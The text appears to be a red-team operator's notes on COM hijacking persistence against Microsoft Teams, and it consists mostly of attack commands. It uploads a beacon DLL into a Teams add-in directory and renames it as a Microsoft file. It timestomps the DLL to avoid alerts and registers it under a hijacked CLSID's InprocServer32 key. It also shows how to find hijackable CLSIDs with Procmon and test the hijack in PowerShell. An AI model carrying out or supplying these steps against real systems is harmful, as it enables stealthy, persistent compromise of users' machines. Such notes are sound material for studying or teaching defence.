
##### COM Hijacking - Foothold Persistence

Upload beacon to a directory that it can blend into

```powershell
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64

upload C:\Payloads\http_x64.dll
```

Change the name to match other files and `timestomp` the timestamp to not raise alerts

```powershell
mv http_x64.dll Microsoft.Teams.HttpClient.dll

timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```

Add the registry entries tested on the VM

```powershell
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"

reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```
##### Locate COM to Hijack

Within replica VM open Procmon and filter with the following

1.  Process Name `is` ms-teams.exe (or target executable) then Include.
2.  Operation `is` RegOpenKey then Include.
3.  Path `ends with` InprocServer32 then Include.
4.  Result `is `NAME NOT FOUND then Include.

Open executable and look for a CLSID that's only called a few times

Test COM hijack by adding the following registry entries (have it match procmon)

```powershell
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"

New-Item -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"

New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

Open the executable and wait for beacon
